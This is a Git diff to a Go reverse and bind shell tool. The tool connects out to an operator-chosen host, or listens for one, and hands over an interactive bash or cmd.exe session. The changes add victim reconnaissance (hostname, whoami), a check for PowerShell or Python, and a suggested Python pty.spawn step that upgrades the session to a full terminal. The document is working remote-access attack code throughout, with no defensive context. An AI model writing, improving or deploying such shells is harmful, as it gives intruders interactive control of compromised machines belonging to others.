@@ -10,7 +10,7 @@ import (
 )
 
 func RunShellCmd(mode string, host string, port string) {
-	//fmt.Println("[+] Start the shell as mode :", mode)
+	fmt.Println("[+] Start the shell as mode :", mode)
 
 	if mode == "bind" {
 		bindShell(host, port)
@@ -35,7 +35,7 @@ func bindShell(host string, port string) {
 		if err != nil {
 			log.Println(err)
 		}
-		//fmt.Printf("[+] Accepting connection from %s\n", conn.RemoteAddr().String())
+		fmt.Printf("[+] Accepting connection from %s\n", conn.RemoteAddr().String())
 		go runShell(conn)
 	}
 
@@ -44,7 +44,7 @@ func bindShell(host string, port string) {
 func reverseShell(host string, port string) {
 
 	address := fmt.Sprintf("%s:%s", host, port)
-	//fmt.Println("[+] Address ", address)
+	fmt.Println("[+] Address ", address)
 
 	conn, err := net.Dial("tcp", address)
 	if err != nil {
@@ -56,21 +56,35 @@ func reverseShell(host string, port string) {
 }
 
 func runShell(conn net.Conn) {
-	var cmd *exec.Cmd
+	r, w := io.Pipe()
+
+	cmd := exec.Command("/bin/bash", "-i")
+
+	go io.Copy(conn, r)
+
+	// Get System information
+	hostname, _ := exec.Command("hostname").Output()
+	whoami, _ := exec.Command("whoami").Output()
+
+	fmt.Fprintf(w, "\n[+] Hostname : %s", hostname)
+	fmt.Fprintf(w, "[+] Whoami : %s", whoami)
 
 	if runtime.GOOS == "windows" {
 		cmd = exec.Command("cmd.exe")
+		path, err := exec.LookPath("powershell")
+		if err == nil {
+			fmt.Fprintf(w, "\n[+] Powershell is installed\n[+] Run : %s\n\n", path)
+		}
 	} else {
-		cmd = exec.Command("/bin/bash", "-i")
+		path, err := exec.LookPath("python")
+		if err == nil {
+			fmt.Fprintf(w, "\n[+] Python is installed\n[+] Run : %s %s\n\n", path, "-c \"import pty; pty.spawn('/bin/bash')\"")
+		}
 	}
-
-	r, w := io.Pipe()
 
 	cmd.Stdin = conn
 	cmd.Stdout = w
 	cmd.Stderr = w
-
-	go io.Copy(conn, r)
 
 	if err := cmd.Run(); err != nil {
 		fmt.Println(err)
